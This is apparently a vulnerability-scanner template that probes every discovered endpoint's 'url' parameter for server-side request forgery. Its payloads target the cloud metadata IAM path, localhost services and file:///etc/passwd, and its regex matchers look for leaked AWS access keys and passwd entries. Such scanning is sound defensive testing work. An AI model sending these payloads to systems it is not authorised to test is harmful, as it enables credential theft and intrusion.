id: generic-ssrf
info:
  name: Server-Side Request Forgery
  description: Detects SSRF via URL parameter manipulation across discovered endpoints
  owasp_category: A03:2025
  severity: high
  tags:
    - ssrf
    - request-forgery
    - generic

generic:
  endpoint: "{{all_discovered}}"
  method: GET
  parameter: "url"

  payloads:
    - "http://169.254.169.254/latest/meta-data/iam/"
    - "http://127.0.0.1:80"
    - "http://localhost:22"
    - "file:///etc/passwd"
    - "http://[::1]/"

  matchers:
    - type: status
      condition: in
      status:
        - 200
        - 201
    - type: regex
      condition: or
      regex:
        - 'Code.*:.*[A-Z0-9]{4}'
        - 'AccessKeyId'
        - 'SecretAccessKey'
        - 'ami-[a-f0-9]{8}'
        - 'root:x:[0-9]+:[0-9]+:'
        - 'OpenSSH'
        - 'localhost'
        - '127\.0\.0\.1'

  matchers_condition: and
